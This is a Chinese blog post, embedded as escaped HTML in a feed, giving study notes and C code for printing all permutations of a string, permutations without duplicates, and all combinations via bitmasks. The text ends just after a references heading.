    <content type="html">&lt;p&gt;记得&lt;a href=&quot;http://weibo.com/jeffz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@老赵&lt;/a&gt;之前在微博上吐槽说，“有的人真是毫无长进，六年前某同事不会写程序输出全排列，昨天发邮件还是问我该怎么写，这时间浪费到我都看不下去了。” 那时候就很好奇全排列到底是什么东西，到底有多难？&lt;/p&gt;
&lt;p&gt;今天复习的时候终于碰到这题了，结果果然自己太渣，看了好久都没明白，代码实现又是磕磕碰碰的。所以，就把它整理成笔记加深记忆，也希望能帮到和我一样的人。&lt;/p&gt;
&lt;h2 id=&quot;全排列&quot;&gt;&lt;a href=&quot;#全排列&quot; class=&quot;headerlink&quot; title=&quot;全排列&quot;&gt;&lt;/a&gt;全排列&lt;/h2&gt;&lt;p&gt;所谓全排列，就是打印出字符串中所有字符的所有排列。例如输入字符串&lt;code&gt;abc&lt;/code&gt;，则打印出 a、b、c 所能排列出来的所有字符串 &lt;code&gt;abc&lt;/code&gt;、&lt;code&gt;acb&lt;/code&gt;、&lt;code&gt;bac&lt;/code&gt;、&lt;code&gt;bca&lt;/code&gt;、&lt;code&gt;cab&lt;/code&gt; 和 &lt;code&gt;cba&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;一般最先想到的方法是暴力循环法，即对于每一位，遍历集合中可能的元素，如果在这一位之前出现过了该元素，跳过该元素。例如对于&lt;code&gt;abc&lt;/code&gt;，第一位可以是 a 或 b 或 c 。当第一位为 a 时，第二位再遍历集合，发现 a 不行，因为前面已经出现 a 了，而 b 和 c 可以。当第二位为 b 时 ， 再遍历集合，发现 a 和 b 都不行，c 可以。可以用递归或循环来实现，但是复杂度为 $O(n^n)$ 。有没有更优雅的解法呢。&lt;/p&gt;
&lt;p&gt;首先考虑&lt;code&gt;bac&lt;/code&gt;和&lt;code&gt;cba&lt;/code&gt;这二个字符串是如何得出的。显然这二个都是&lt;code&gt;abc&lt;/code&gt;中的 a 与后面两字符交换得到的。然后可以将&lt;code&gt;abc&lt;/code&gt;的第二个字符和第三个字符交换得到&lt;code&gt;acb&lt;/code&gt;。同理可以根据&lt;code&gt;bac&lt;/code&gt;和&lt;code&gt;cba&lt;/code&gt;来得&lt;code&gt;bca&lt;/code&gt;和&lt;code&gt;cab&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;因此可以知道 &lt;strong&gt;全排列就是从第一个数字起每个数分别与它后面的数字交换&lt;/strong&gt;，也可以得出这种解法每次得到的结果都是正确结果，所以复杂度为 O(n!)。找到这个规律后，递归的代码就很容易写出来了：&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//交换两个字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Swap&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *a ,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *b)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; temp = *a;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	*a = *b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	*b = temp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//递归全排列，start 为全排列开始的下标， length 为str数组的长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;AllRange&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* str,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; start,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; length)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(start == length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%s\n&quot;&lt;/span&gt;,str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=start;i&amp;lt;=length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;i++)	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;	&lt;span class=&quot;comment&quot;&gt;//从下标为start的数开始，分别与它后面的数字交换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			Swap(&amp;amp;str[start],&amp;amp;str[i]); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			AllRange(str,start+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			Swap(&amp;amp;str[start],&amp;amp;str[i]); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Permutation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* str)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(str == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	AllRange(str,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(str));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; str[] = &lt;span class=&quot;string&quot;&gt;&quot;abc&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	Permutation(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;去重的全排列&quot;&gt;&lt;a href=&quot;#去重的全排列&quot; class=&quot;headerlink&quot; title=&quot;去重的全排列&quot;&gt;&lt;/a&gt;去重的全排列&lt;/h2&gt;&lt;p&gt;为了得到不一样的排列，可能我们最先想到的方法是当遇到和自己相同的就不交换了。如果我们输入的是&lt;code&gt;abb&lt;/code&gt;，那么第一个字符与后面的交换后得到 &lt;code&gt;bab&lt;/code&gt;、&lt;code&gt;bba&lt;/code&gt;。然后&lt;code&gt;abb&lt;/code&gt;中，第二个字符和第三个就不用交换了。但是对于&lt;code&gt;bab&lt;/code&gt;，它的第二个字符和第三个是不同的，交换后得到&lt;code&gt;bba&lt;/code&gt;，和之前的重复了。因此，这种方法不行。&lt;/p&gt;
&lt;p&gt;因为&lt;code&gt;abb&lt;/code&gt;能得到&lt;code&gt;bab&lt;/code&gt;和&lt;code&gt;bba&lt;/code&gt;，而&lt;code&gt;bab&lt;/code&gt;又能得到&lt;code&gt;bba&lt;/code&gt;，那我们能不能第一个&lt;code&gt;bba&lt;/code&gt;不求呢？ 我们有了这种思路，第一个字符&lt;code&gt;a&lt;/code&gt;与第二个字符&lt;code&gt;b&lt;/code&gt;交换得到&lt;code&gt;bab&lt;/code&gt;，然后考虑第一个字符&lt;code&gt;a&lt;/code&gt;与第三个字符&lt;code&gt;b&lt;/code&gt;交换，此时由于第三个字符等于第二个字符，所以它们不再交换。再考虑&lt;code&gt;bab&lt;/code&gt;，它的第二个与第三个字符交换可以得到&lt;code&gt;bba&lt;/code&gt;。此时全排列生成完毕，即&lt;code&gt;abb&lt;/code&gt;、&lt;code&gt;bab&lt;/code&gt;、&lt;code&gt;bba&lt;/code&gt;三个。&lt;/p&gt;
&lt;p&gt;这样我们也得到了在全排列中去掉重复的规则：&lt;strong&gt;去重的全排列就是从第一个数字起每个数分别与它后面非重复出现的数字交换&lt;/strong&gt;。用编程的话描述就是第i个数与第j个数交换时，要求[i,j)中没有与第j个数相等的数。下面给出完整代码：&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//交换两个字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Swap&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *a ,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *b)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; temp = *a;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	*a = *b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	*b = temp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//在 str 数组中，[start,end) 中是否有与 str[end] 元素相同的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;IsSwap&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* str,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; start,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; end)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(;start&amp;lt;end;start++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(str[start] == str[end])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//递归去重全排列，start 为全排列开始的下标， length 为str数组的长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;AllRange2&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* str,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; start,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; length)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(start == length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%s\n&quot;&lt;/span&gt;,str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=start;i&amp;lt;=length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(IsSwap(str,start,i))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				Swap(&amp;amp;str[start],&amp;amp;str[i]); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				AllRange2(str,start+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				Swap(&amp;amp;str[start],&amp;amp;str[i]); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Permutation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* str)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(str == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	AllRange2(str,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(str));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; str[] = &lt;span class=&quot;string&quot;&gt;&quot;abb&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	Permutation(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;全组合&quot;&gt;&lt;a href=&quot;#全组合&quot; class=&quot;headerlink&quot; title=&quot;全组合&quot;&gt;&lt;/a&gt;全组合&lt;/h2&gt;&lt;p&gt;如果不是求字符的所有排列，而是求字符的所有组合应该怎么办呢？还是输入三个字符 a、b、c，则它们的组合有&lt;code&gt;a&lt;/code&gt; &lt;code&gt;b&lt;/code&gt; &lt;code&gt;c&lt;/code&gt; &lt;code&gt;ab&lt;/code&gt; &lt;code&gt;ac&lt;/code&gt; &lt;code&gt;bc&lt;/code&gt; &lt;code&gt;abc&lt;/code&gt;。当然我们还是可以借鉴全排列的思路，利用问题分解的思路，最终用递归解决。不过这里介绍一种比较巧妙的思路 —— 基于位图。&lt;/p&gt;
&lt;p&gt;假设原有元素 n 个，则最终组合结果是 $2^n-1$ 个。我们可以用位操作方法：假设元素原本有：a,b,c 三个，则 1 表示取该元素，0 表示不取。故取&lt;code&gt;a&lt;/code&gt;则是&lt;code&gt;001&lt;/code&gt;，取&lt;code&gt;ab&lt;/code&gt;则是&lt;code&gt;011&lt;/code&gt;。所以一共三位，每个位上有两个选择 0 和 1。而&lt;code&gt;000&lt;/code&gt;没有意义，所以是$2^n-1$个结果。&lt;/p&gt;
&lt;p&gt;这些结果的位图值都是 1,2…2^n-1。所以从值 1 到值 $2^n-1$ 依次输出结果：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;001&lt;/code&gt;,&lt;code&gt;010&lt;/code&gt;,&lt;code&gt;011&lt;/code&gt;,&lt;code&gt;100&lt;/code&gt;,&lt;code&gt;101&lt;/code&gt;,&lt;code&gt;110&lt;/code&gt;,&lt;code&gt;111&lt;/code&gt; 。对应输出组合结果为：&lt;code&gt;a&lt;/code&gt;,&lt;code&gt;b&lt;/code&gt;,&lt;code&gt;ab&lt;/code&gt;,&lt;code&gt;c&lt;/code&gt;,&lt;code&gt;ac&lt;/code&gt;,&lt;code&gt;bc&lt;/code&gt;,&lt;code&gt;abc&lt;/code&gt;。&lt;br&gt;因此可以循环 1~2^n-1，然后输出对应代表的组合即可。有代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Combination&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(str == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; n = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;len;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;i&amp;lt;n;i++)    &lt;span class=&quot;comment&quot;&gt;//从 1 循环到 2^len -1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; j=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j&amp;lt;len;j++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; temp = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(temp &amp;amp; (&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;j))   &lt;span class=&quot;comment&quot;&gt;//对应位上为1，则输出对应的字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%c&quot;&lt;/span&gt;,*(str+j));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; str[] = &lt;span class=&quot;string&quot;&gt;&quot;abc&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	Combination(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
